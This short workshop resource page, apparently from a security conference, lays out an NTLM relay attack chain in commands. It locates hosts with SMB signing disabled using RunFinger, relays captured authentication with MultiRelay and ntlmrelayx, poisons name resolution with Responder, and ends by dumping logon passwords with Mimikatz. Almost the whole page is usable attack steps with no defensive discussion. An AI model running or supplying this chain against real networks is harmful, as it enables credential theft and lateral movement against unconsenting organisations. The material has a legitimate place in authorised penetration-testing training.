# DojoConf-Recursos

comando de Busqueda herramientas:
```
find /usr/share/responder/ -name "MultiRelay.py" -print
find /usr/share/responder/ -name "ntlmrelayx.py" -print
```

1. Identify network systems that do not require SMB message validation to detect machine with SMB signing:disabled.
```
python RunFinger.py -i 192.168.0.0/24
```
2. Configure Impacket’s NTLMrelayx to target those systems
```
echo "IP"  >> targets.txt
 ```   
 ```
 python MultiRelay.py -t <target_machine_IP> -u ALL -d
 ntlmrelayx.py -tf targets.txt --smb2support
 ```
3. Disable SMB and HTTP response poisoning in Responder and launch
```
cd /usr/share/responder
```
```
gedit Responder.conf
```
4. Open the Responder.conf file and set the value of SMB and HTTP to Off
```
Responder.py** -I eth0 -rdw
```
5. Wait for creds
6. Invoke standard Mimikatz
```
mimi sekurlsa::logonpasswords
```



